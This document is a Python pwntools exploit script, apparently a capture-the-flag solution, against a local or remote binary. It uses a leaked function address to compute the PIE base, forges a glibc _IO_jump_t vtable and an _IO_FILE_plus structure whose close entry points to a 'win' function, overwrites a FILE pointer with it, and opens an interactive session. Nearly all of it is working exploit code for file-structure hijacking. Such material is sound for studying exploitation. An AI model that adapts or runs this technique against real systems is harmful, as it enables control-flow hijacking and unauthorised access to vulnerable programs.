import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###
win_func_off = 0x00100a5a
buf_addr = 0x00302060

###main###
def main():
    ###payload###
    _ = target.recvuntil("<win> = ")
    win_func_addr = int(target.recvline()[2:-1], 16)
    pie_base = win_func_addr - win_func_off
    print("[*]pie_base addr = 0x{:x}".format(pie_base))

    buf_addr = 0x202060 + pie_base
    vtable_addr = buf_addr

    # _IO_jump_t
    payload = p64(0) # __dummy
    payload += p64(0) # __dummy2
    payload += p64(0) # __finish
    payload += p64(0) # __overflow
    payload += p64(0) # __underflow
    payload += p64(0) # __uflow
    payload += p64(0) # __pbackfail
    payload += p64(0) # __xsputn
    payload += p64(0) # __xsgetn
    payload += p64(0) # __seekoff
    payload += p64(0) # __seekpos
    payload += p64(0) # __setbuf
    payload += p64(0) # __sync
    payload += p64(0) # __doallocate
    payload += p64(0) # __read
    payload += p64(0) # __write
    payload += p64(0) # __seek
    payload += p64(win_func_addr) # __close
    payload += p64(0) # __stat
    payload += p64(0) # __showmanyc
    payload += p64(0) # __imbue

    file_struct_addr = buf_addr + len(payload)

    # _IO_FILE_plus
    head_of_IO_FILE = len(payload)
    payload += p64(0xfbad2498) # flags
    payload += p64(pie_base + 0x203490) # _IO_read_ptr
    payload += p64(pie_base + 0x203490) # _IO_read_end
    payload += p64(pie_base + 0x203490) # _IO_read_base
    payload += p64(pie_base + 0x203490) # _IO_write_base
    payload += p64(pie_base + 0x203490) # _IO_write_ptr
    payload += p64(pie_base + 0x203490) # _IO_write_end
    payload += p64(pie_base + 0x203490) # _IO_buf_base
    payload += p64(pie_base + 0x203490) # _IO_buf_end
    payload += p64(0) # _IO_save_base
    payload += p64(0) # _IO_backup_base
    payload += p64(0) # _IO_save_end
    payload += p64(0) # _mackers
    payload += p64(0) # _chain
    payload += p32(3) # _fileno
    payload += p32(0) # _flags2
    payload += p64(0) # _old_offset
    payload += p64(0) # _cur_column + _vtable_offset + _shortbuf
    payload += p64(file_struct_addr + 224) # _lock
    payload += p64(0xffffffffffffffff) # _offset
    payload += p64(0) # _codecvt
    payload += p64(pie_base + 0x203490) # _wide_data
    payload += p64(0) # _freeres_list
    payload += p64(0) # _freeres_buf
    payload += p64(0) # __pad5
    payload += p64(0xffffffff) # _mode
    payload += b'\x00' * (216 - (len(payload) - head_of_IO_FILE)) # _unused2

    payload += p64(vtable_addr) # vtable

    payload += b'\x00'  * (512 - len(payload)) # padding
    payload += p64(file_struct_addr)

    #_ = target.recvuntil("")
    target.sendline(payload)
    #ret = target.recv(2048)

    target.interactive()


if __name__ == "__main__":
    main()